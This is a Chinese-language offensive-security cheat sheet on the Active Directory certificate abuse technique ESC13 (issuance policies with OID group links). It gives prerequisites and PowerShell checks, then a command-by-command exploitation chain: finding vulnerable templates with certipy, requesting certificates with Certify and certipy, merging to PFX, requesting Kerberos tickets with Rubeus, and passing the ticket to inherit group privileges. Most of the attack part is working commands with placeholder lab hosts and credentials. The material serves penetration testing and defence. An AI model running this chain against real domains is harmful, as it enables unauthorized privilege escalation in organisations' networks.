# Active Directory - 证书 ESC13

## ESC13 - 颁发策略

> 如果某个主体（用户或计算机）对配置了颁发策略的证书模板拥有注册权限，且该颁发策略具有 OID 组链接，那么该主体可以注册一个证书，从而以 OID 组链接中指定的组成员身份获取对环境的访问权限。

**前提条件**

* 主体对证书模板拥有注册权限
* 证书模板具有颁发策略扩展
* 颁发策略具有到某个组的 OID 组链接
* 证书模板定义了启用客户端身份验证的 EKU

```ps1
PS C:\> $ESC13Template = Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties nTSecurityDescriptor $ESC13Template.nTSecurityDescriptor.Access | ? {$_.IdentityReference -eq "DUMPSTER\ESC13User"}
AccessControlType     : Allow

# 检查 msPKI-Certificate-Policy 中是否存在颁发策略
PS C:\> Get-ADObject "CN=ESC13Template,$TemplateContainer" -Properties msPKI-Certificate-Policy
msPKI-Certificate-Policy : {1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448}

# 检查 OID 组链接
PS C:\> Get-ADObject "CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
msDS-OIDToGroupLink     : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire

# 验证 ESC13Group 是否为通用组
PS C:\> Get-ADGroup ESC13Group -Properties Members
GroupScope        : Universal
Members           : {}
```

**利用方法**：

* 查找易受攻击的模板

  ```ps1
  certipy find -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -stdout -vulnerable
  ```

* 为易受攻击的模板请求证书

  ```ps1
  .\Certify.exe request /ca:DC01\dumpster-DC01-CA /template:ESC13Template
  certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -template <ESC13-Template> -ca <CA-NAME>
  ```

* 合并为 PFX 文件

  ```ps1
  certutil -MergePFX .\esc13.pem .\esc13.pfx
  ```

* 验证是否存在"客户端身份验证"和"策略标识符"

  ```ps1
  certutil -Dump -v .\esc13.pfx
  ```

* 传递证书：为我们的用户请求 TGT，同时我们也是链接组的成员并继承了其权限

  ```ps1
  Rubeus.exe asktgt /user:ESC13User /certificate:C:\esc13.pfx /nowrap
  Rubeus.exe asktgt /user:username /certificate:username.pfx /domain:lab.local /dc:dc /nowrap
  ```

* 票据传递：使用授予 AD 组权限的票据

  ```ps1
  Rubeus.exe ptt /ticket:<ticket>
  ```

## 参考资料

* [ADCS ESC13 Abuse Technique - Jonas Bülow Knudsen - 02/15/2024](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)
* [Exploitation de l'AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
